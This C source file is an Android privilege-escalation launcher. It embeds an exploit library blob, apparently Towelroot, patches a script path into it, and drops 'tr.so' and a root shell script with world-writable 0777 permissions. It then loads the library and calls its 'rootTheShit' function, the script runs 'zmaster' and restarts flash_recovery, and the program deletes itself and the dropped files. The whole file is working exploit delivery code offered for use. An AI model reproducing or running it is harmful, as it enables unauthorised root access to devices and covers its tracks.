#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include "tr2.h"

//#define DBG(fmt, args...) printf("%s %d: "fmt, __FILE__, __LINE__, ##args);
#define DBG(...)

bool write_file(char *path, char *data, int size, int mode) {
    unlink(path);
    FILE *fp = fopen(path, "wb");
    if(fp != NULL) {
        fwrite(data, 1, size, fp);
        fflush(fp);
        fclose(fp);
        chmod(path, mode);
        return true;
    }
    return false;
}

typedef char *(*geohot_func_t)();

void getDirName(char *path, char *out) {
    char *end = strrchr(path, '/');
    *out = '\0';

    if(end == path || end == NULL) {
        return;
    }

    char *p = path;
    char *q = out;
    while(p != end) {
        *q++ = *p++;
    }
    *q = '\0';
}

void mod_data(char *data, int len, char *key, char *value) {
    char *p = (char *)memmem(data, len, key, strlen(key));
    if(p == NULL) {
        DBG("modify error: find substring fail\n");
        return;
    }

    char *q = value;
    while(*q != '\0') {
        *p++ = *q++;
    }
    *p = ' '; // hack append a space
}

int main(int argc, char *argv[]) {
    void *handle;
    geohot_func_t func;
    char *resp;

    char basedir[128];
    char so_name[256];
    char sh_name[256];
    char sh[512];

    char *so_data = (char *)malloc(sizeof(tr2_so));
    memcpy(so_data, tr2_so, sizeof(tr2_so));

    getDirName(argv[0], basedir);
    snprintf(so_name, sizeof(so_name), "%s/tr.so", basedir);
    snprintf(sh_name, sizeof(sh_name), "%s/tr.sh", basedir);

    if(strlen(sh_name) > 38) {
        chdir(basedir);
        mod_data(so_data, sizeof(tr2_so), "/data/local/tmp/work/tr.sh", "./tr.sh");
    } else {
        mod_data(so_data, sizeof(tr2_so), "/data/local/tmp/work/tr.sh", sh_name);
    }

    do {
        snprintf(sh, sizeof(sh), "#!/system/bin/sh\n"
                 "export PATH=$PATH:/system/bin:/system/xbin\n"
                 "id\n"
                 "%s/zmaster -W -from-tr\n"
                 "stop flash_recovery; start flash_recovery\n"
                 "sleep 2\n"
                 "%s/zmaster -R -from-tr\n", basedir, basedir);

        if(argc > 1 && strcmp(argv[1], "-i")==0) {
            snprintf(sh, sizeof(sh), "#!/system/bin/sh\n"
                     "export PATH=$PATH:/system/bin:/system/xbin\n"
                     "id\n"
                     "%s/zmaster -I -from-tr\n"
                     "stop flash_recovery; start flash_recovery\n", basedir);
        }

        if(!write_file(so_name, so_data, sizeof(tr2_so), 0777)
                || !write_file(sh_name, sh, strlen(sh), 0777)) {
            DBG("write file fail!\n");
            break;
        }

        if((handle = dlopen(so_name, RTLD_LAZY)) == NULL) {
            DBG("dlopen fail!\n");
            break;
        }

        if((func = (geohot_func_t)dlsym(handle, "Java_com_geohot_towelroot_TowelRoot_rootTheShit")) == NULL) {
            DBG("dlsym fail!\n");
            dlclose(handle);
            break;
        }

        resp = func();
        DBG("resp:<%s>\n", resp);

        dlclose(handle);
    } while(0);

    free(so_data);
    unlink(argv[0]);
    unlink(so_name);
    unlink(sh_name);
    return 0;
}

